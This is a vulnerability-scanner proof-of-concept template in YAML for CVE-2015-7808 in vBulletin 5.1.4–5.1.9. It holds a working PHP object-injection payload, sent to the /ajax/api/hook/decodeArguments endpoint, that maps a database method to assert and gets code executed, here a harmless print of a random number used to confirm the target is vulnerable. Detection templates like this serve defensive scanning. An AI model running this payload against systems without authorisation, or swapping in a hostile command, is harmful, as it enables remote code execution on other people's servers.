name: poc-yaml-vbulletin5-cve-2015-7808
set:
  r: randomInt(10000,20000)
rules:
  - method: GET
    path: "/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A10%3A%22print%28{{r}}%29%22%3B%7D"
    expression: |
      status == 200 && body.bcontains(bytes(string(r)))

detail:
  author: violin
  vBulletin: 5.1.4 - 5.1.9
  links:
    - https://www.anquanke.com/post/id/82861
    - http://blog.nsfocus.net/vbulletin-5-rce-vulnerability/